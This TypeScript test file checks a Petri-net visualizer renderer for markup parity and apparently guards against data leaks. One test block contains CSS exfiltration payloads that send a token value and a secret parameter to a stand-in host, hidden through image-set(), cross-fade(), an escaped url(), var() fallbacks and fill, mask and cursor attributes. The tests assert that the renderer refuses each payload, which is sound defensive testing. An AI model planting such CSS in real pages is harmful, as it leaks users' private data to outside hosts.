import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { buildVisualizerContext } from "@hashintel/petrinaut-core";
import {
  deploymentPipelineSDCPN,
  probabilisticSatellitesSDCPN,
  supplyChainProfit,
  supplyChainWithDisruption,
} from "@hashintel/petrinaut-core/examples";
import { lowerVisualizerToHir } from "@hashintel/petrinaut-core/view-hir";

import { renderVisualizerHir } from "./render-visualizer-hir";
import { sampleParameters, sampleTokens } from "./visualizer-parity-fixture";
import fixture from "./visualizer-parity.fixture.json";

import type { HirVisualizerContext, SDCPN } from "@hashintel/petrinaut-core";

const context: HirVisualizerContext = {
  surface: "visualizer",
  parameters: [],
  elements: [{ name: "x", type: "real" }],
};

const render = (
  code: string,
  tokens: Record<string, number | boolean | bigint | string>[] = [{ x: 1 }],
  lowerContext = context,
  parameters: Record<string, number | boolean> = {},
) => {
  const lowered = lowerVisualizerToHir(code, lowerContext);
  if (!lowered.ok) {
    throw new Error(lowered.diagnostics.map((item) => item.message).join("; "));
  }
  return renderToStaticMarkup(
    renderVisualizerHir(lowered.view, tokens, parameters),
  );
};

describe("renderVisualizerHir", () => {
  /**
   * The markup the Babel-compiled components produced for the same frame,
   * recorded before that compiler was removed. Every shipped visualizer must
   * draw the same picture through the HIR.
   */
  describe("draws every example visualizer as the compiled component did", () => {
    const examples = new Map<string, SDCPN>(
      [
        probabilisticSatellitesSDCPN,
        deploymentPipelineSDCPN,
        supplyChainWithDisruption,
        supplyChainProfit,
      ].map((example) => [example.title, example.petriNetDefinition]),
    );
    it.for(fixture)("$example / $place", ({ example, place, markup }) => {
      const sdcpn = examples.get(example)!;
      const placeDefinition = sdcpn.places.find(
        (candidate) => candidate.name === place,
      )!;
      const color = sdcpn.types.find(
        (type) => type.id === placeDefinition.colorId,
      )!;
      expect(
        render(
          placeDefinition.visualizerCode!,
          sampleTokens(color),
          buildVisualizerContext(sdcpn, placeDefinition),
          sampleParameters(sdcpn),
        ),
      ).toBe(markup);
    });
  });

  it("renders fragments, keys, booleans and nested arrays as React does", () => {
    expect(
      render(
        `export default Visualization(({ tokens }) => (
  <>
    {tokens.map((token, index) => <circle key={index} cx={token.x} />)}
    {false}
    {null}
    <text>{tokens.length}{" "}items</text>
  </>
));`,
        [{ x: 1 }, { x: 2 }],
      ),
    ).toBe(
      '<circle cx="1"></circle><circle cx="2"></circle><text>2 items</text>',
    );
  });

  it("refuses a remote url computed at run time", () => {
    expect(() =>
      render(
        `export default Visualization(({ tokens }) => (
  <rect fill={"url(https://x.test/?" + tokens.length + ")"} />
));`,
      ),
    ).toThrow(/url\(#id\)/u);
  });

  /**
   * Each of these passes the lowering and its checker, since the value is
   * computed, and builds a destination from a token value and a parameter.
   * The renderer must refuse it before any React element exists.
   */
  describe("refuses a resource computed from tokens and parameters", () => {
    const privateContext: HirVisualizerContext = {
      surface: "visualizer",
      parameters: [{ name: "secret", type: "real" }],
      elements: [{ name: "x", type: "real" }],
    };
    // The placeholders belong to the visualizer source, which interpolates them.
    const destination =
      // eslint-disable-next-line no-template-curly-in-string -- see above
      "https://visualizer-probe.invalid/?token=${token.x}&parameter=${parameters.secret}";

    it.for([
      {
        case: "image-set()",
        style: `background: \`image-set("${destination}" 1x)\``,
      },
      {
        case: "-webkit-image-set() with url()",
        style: `background: \`-webkit-image-set(url(${destination}) 1x)\``,
      },
      {
        case: "image-set() layered after a gradient",
        style: `background: \`linear-gradient(red, blue), image-set("${destination}" 1x)\``,
      },
      {
        case: "image()",
        style: `background: \`image("${destination}")\``,
      },
      {
        case: "cross-fade()",
        style: `background: \`cross-fade(url(${destination}) 50%, red)\``,
      },
      {
        case: "an escaped url()",
        style: `background: \`u\\\\72l("${destination}")\``,
      },
      {
        case: "a function name assembled at run time",
        style: `background: "image" + "-set(" + \`"${destination}" 1x)\``,
      },
      {
        case: "a var() fallback",
        style: `background: \`var(--missing, url(${destination}))\``,
      },
    ])("$case", ({ style }) => {
      const code = `export default Visualization(({ tokens, parameters }) => (
  <svg>
    {tokens.map((token) => <rect key={token.x} style={{ ${style} }} />)}
  </svg>
));`;
      const lowered = lowerVisualizerToHir(code, privateContext);
      expect(
        lowered.ok ? [] : lowered.diagnostics.map((item) => item.message),
      ).toEqual([]);
      if (!lowered.ok) {
        return;
      }
      expect(() =>
        renderVisualizerHir(lowered.view, [{ x: 731 }], { secret: 42 }),
      ).toThrow(
        /`background` contains unsupported CSS or an external resource/u,
      );
    });

    it.for(["fill", "mask", "cursor"])("in %s", (name) => {
      const attribute =
        name === "cursor"
          ? `style={{ cursor: \`url(${destination}) 0 0, auto\` }}`
          : `${name}={\`url(${destination})\`}`;
      const code = `export default Visualization(({ tokens, parameters }) => (
  <svg>
    {tokens.map((token) => <rect key={token.x} ${attribute} />)}
  </svg>
));`;
      const lowered = lowerVisualizerToHir(code, privateContext);
      expect(lowered.ok).toBe(true);
      if (!lowered.ok) {
        return;
      }
      expect(() =>
        renderVisualizerHir(lowered.view, [{ x: 731 }], { secret: 42 }),
      ).toThrow(`\`${name}\` contains unsupported CSS or an external resource`);
    });
  });

  it("draws computed gradients, transforms and fragment references", () => {
    expect(
      render(
        `export default Visualization(({ tokens }) => (
  <g transform={\`rotate(\${tokens.length * 10} 5 5)\`}>
    <rect
      fill={\`url(#gradient-\${tokens.length})\`}
      style={{ background: \`linear-gradient(90deg, rgba(0, 0, 0, \${tokens.length / 2}), #fff)\` }}
    />
  </g>
));`,
      ),
    ).toBe(
      '<g transform="rotate(10 5 5)"><rect fill="url(#gradient-1)" style="background:linear-gradient(90deg, rgba(0, 0, 0, 0.5), #fff)"></rect></g>',
    );
  });

  it("draws computed clipping shapes", () => {
    expect(
      render(
        `export default Visualization(({ tokens }) => (
  <svg><rect clipPath={\`circle(\${tokens.length * 10}px)\`} /></svg>
));`,
      ),
    ).toBe('<svg><rect clip-path="circle(10px)"></rect></svg>');
  });

  it("leaves a null attribute unset", () => {
    expect(
      render(
        `export default Visualization(({ tokens }) => (
  <rect fill={tokens.length > 5 ? "red" : null} width={1} />
));`,
      ),
    ).toBe('<rect width="1"></rect>');
  });
});
